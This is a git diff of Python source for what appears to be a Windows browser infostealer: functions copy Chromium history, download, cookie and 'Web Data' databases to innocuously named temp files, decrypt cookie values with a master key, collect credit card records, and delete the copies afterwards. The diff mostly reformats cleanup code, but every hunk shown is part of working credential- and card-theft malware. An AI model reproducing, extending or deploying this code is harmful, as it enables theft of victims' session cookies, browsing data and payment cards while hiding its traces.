@@ -153,10 +153,10 @@ def get_web_history(path, blink = False):
             if result in history:
                 continue
             history += result + "\n\n"
-        try:
-            remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\hwincache.db')
-        except:
-            pass
+        
+        c.close()
+        try: remove(environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\hwincache.db')
+        except: pass
     except Exception as e:
         Log(f"{path} history ---> {e}")
 
@@ -177,9 +177,9 @@ def get_downloads(path, blink = False):
         for row in cursor.fetchall():
             if not all(row[:1]): continue
             downhistory += str(Types.DownHistory(row[0], row[1])) + "\n\n"
+
         conn.close()
-        try:
-            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\dwincache.db')
+        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\dwincache.db')
         except: pass
     except Exception as e:
         Log(f"{path} downhistory ---> {e}")
@@ -204,11 +204,10 @@ def get_cookies(path, master_key, blink = False):
             cookie_value = decrypt_password(row[3], master_key)
             cookie_line = Types.Cookie(row[0], row[1], row[2], cookie_value, row[4])
             cookies += str(cookie_line) + "\n"
+        
         conn.close()
-        try:
-            remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
-        except:
-            pass
+        try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
+        except: pass
     except Exception as e:
         Log(f"{path} cookies ---> {e}")
 
@@ -245,7 +244,7 @@ def get_credit_cards(path, master_key, blink = False):
             cards += f"===============================\n\n\n{profile}:\n\n"
         cards_db = f'{path}\\Web Data'
         if not exists(cards_db): return
-        
+
         copy2(cards_db, environ['USERPROFILE'] + '\\AppData\\Local\\Temp\\crwincache.db')
         conn = connect(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\crwincache.db')
         cursor = conn.cursor()
